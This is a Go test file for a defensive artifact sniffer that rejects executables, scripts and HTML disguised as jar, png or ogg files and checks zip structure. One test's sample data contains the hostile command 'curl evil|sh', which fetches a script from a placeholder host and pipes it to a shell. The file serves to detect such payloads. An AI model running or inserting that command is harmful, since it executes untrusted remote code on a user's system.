package main

import "testing"

// makeZipWithEOCD 构造“local 头 + 合法 EOCD”的最小 zip 字节，totalEntries
// 写入 EOCD+10。
func makeZipWithEOCD(totalEntries uint16) []byte {
	buf := make([]byte, 0, 26)
	buf = append(buf, 'P', 'K', 0x03, 0x04)
	eocd := make([]byte, 22)
	eocd[0], eocd[1], eocd[2], eocd[3] = 'P', 'K', 0x05, 0x06
	eocd[10] = byte(totalEntries)
	eocd[11] = byte(totalEntries >> 8)
	buf = append(buf, eocd...)
	return buf
}

func TestSniffKindBasic(t *testing.T) {
	cases := []struct {
		name string
		data []byte
		want ArtifactKind
	}{
		{"png", append(append([]byte{}, sigPNG...), []byte("rest")...), KindPNG},
		{"jpeg", []byte{0xff, 0xd8, 0xff, 0xe0}, KindJPEG},
		{"gif", []byte("GIF89a...."), KindGIF},
		{"ogg", []byte("OggS...."), KindOGG},
		{"gzip", []byte{0x1f, 0x8b, 0x08}, KindGzip},
		{"pdf", []byte("%PDF-1.7"), KindPDF},
		{"mz", append([]byte{'M', 'Z'}, 0, 0, 0), KindExecutable},
		{"elf", []byte{0x7f, 'E', 'L', 'F', 2}, KindExecutable},
		{"shebang", []byte("#!/bin/sh\necho"), KindScript},
		{"zip", []byte{'P', 'K', 0x03, 0x04, 0x14}, KindZip},
		{"empty-zip", []byte{'P', 'K', 0x05, 0x06}, KindZip},
		{"html", []byte("<!doctype html><html>"), KindTextHTML},
		{"xml", []byte("<?xml version=\"1.0\"?>"), KindTextHTML},
		{"unknown", []byte{0x10, 0x20, 0x30, 0x40}, KindUnknown},
		{"empty", []byte{}, KindUnknown},
	}
	for _, c := range cases {
		if got := SniffKind(c.data); got != c.want {
			t.Fatalf("%s: got %s want %s", c.name, got, c.want)
		}
	}
}

func TestSniffArtifactValidJar(t *testing.T) {
	full := makeZipWithEOCD(1)
	v := SniffArtifact("jar", full[:8], full, defaultContentSniffLimits())
	if !v.OK {
		t.Fatalf("valid jar should pass, got %s", v.Reason)
	}
	if v.ZipEntries != 1 {
		t.Fatalf("entries=%d", v.ZipEntries)
	}
}

func TestSniffArtifactValidPNG(t *testing.T) {
	head := append(append([]byte{}, sigPNG...), make([]byte, 16)...)
	v := SniffArtifact("png", head, nil, defaultContentSniffLimits())
	if !v.OK {
		t.Fatalf("png should pass, got %s", v.Reason)
	}
}

func TestSniffArtifactHTMLDisguisedAsJar(t *testing.T) {
	head := []byte("<!doctype html><html><body>502 Bad Gateway</body>")
	v := SniffArtifact("jar", head, head, defaultContentSniffLimits())
	if v.OK || v.Reason != "html-disguised" {
		t.Fatalf("expected html-disguised, got ok=%v reason=%s", v.OK, v.Reason)
	}
}

func TestSniffArtifactExecutableRejected(t *testing.T) {
	for _, purpose := range []string{"jar", "png", "unknown-bin"} {
		head := append([]byte{'M', 'Z', 0x90, 0x00}, make([]byte, 32)...)
		v := SniffArtifact(purpose, head, nil, defaultContentSniffLimits())
		if v.OK || v.Reason != "executable-disguised" {
			t.Fatalf("purpose %s: expected executable-disguised, got ok=%v reason=%s", purpose, v.OK, v.Reason)
		}
	}
}

func TestSniffArtifactShebangRejected(t *testing.T) {
	head := []byte("#!/bin/sh\ncurl evil|sh")
	v := SniffArtifact("ogg", head, nil, defaultContentSniffLimits())
	if v.OK || v.Reason != "script-disguised" {
		t.Fatalf("expected script-disguised, got %s", v.Reason)
	}
}

func TestSniffArtifactMagicMismatch(t *testing.T) {
	// 声明 jar 但内容是 PNG。
	head := append(append([]byte{}, sigPNG...), make([]byte, 24)...)
	v := SniffArtifact("jar", head, nil, defaultContentSniffLimits())
	if v.OK || v.Reason != "magic-mismatch:zip" {
		t.Fatalf("expected magic-mismatch, got ok=%v reason=%s", v.OK, v.Reason)
	}
}

func TestSniffArtifactZipStructure(t *testing.T) {
	lim := defaultContentSniffLimits()
	// 有 local 头但全文无 EOCD。
	bad := append([]byte{'P', 'K', 0x03, 0x04}, make([]byte, 40)...)
	v := SniffArtifact("zip", bad[:8], bad, lim)
	if v.OK || v.Reason != "zip-no-eocd" {
		t.Fatalf("expected zip-no-eocd, got ok=%v reason=%s", v.OK, v.Reason)
	}
	// 条目数超上限（用小上限避免 EOCD 16 位计数截断）。
	small := ContentSniffLimits{MinArtifactBytes: 16, MaxZipEntries: 10, MaxHeadProbe: 65536}
	big := makeZipWithEOCD(11)
	v = SniffArtifact("zip", big[:8], big, small)
	if v.OK || v.Reason != "zip-too-many-entries" {
		t.Fatalf("expected zip-too-many-entries, got ok=%v reason=%s", v.OK, v.Reason)
	}
	// 截断。
	v = SniffArtifact("jar", []byte{'P', 'K', 0x03, 0x04}, []byte{'P', 'K', 3, 4}, lim)
	if v.OK || v.Reason != "zip-truncated" {
		t.Fatalf("expected zip-truncated, got ok=%v reason=%s", v.OK, v.Reason)
	}
}

func TestSniffArtifactEmptyContent(t *testing.T) {
	v := SniffArtifact("jar", nil, nil, defaultContentSniffLimits())
	if v.OK || v.Reason != "empty-content" {
		t.Fatalf("expected empty-content, got ok=%v reason=%s", v.OK, v.Reason)
	}
}

func TestSniffArtifactUnknownPurposePasses(t *testing.T) {
	// 未登记用途的普通二进制，不含可执行/脚本/HTML 头，应放行。
	head := []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08}
	v := SniffArtifact("custom", head, nil, defaultContentSniffLimits())
	if !v.OK {
		t.Fatalf("unknown-purpose benign bytes should pass, got %s", v.Reason)
	}
}

func TestScanDeepPolyglot(t *testing.T) {
	head := make([]byte, 128)
	head[60] = 'M'
	head[61] = 'Z'
	idx := ScanDeepPolyglot(head, 0)
	if idx != 60 {
		t.Fatalf("expected MZ at 60, got %d", idx)
	}
	clean := make([]byte, 128)
	if ScanDeepPolyglot(clean, 0) != -1 {
		t.Fatal("clean head should have no executable signature")
	}
}
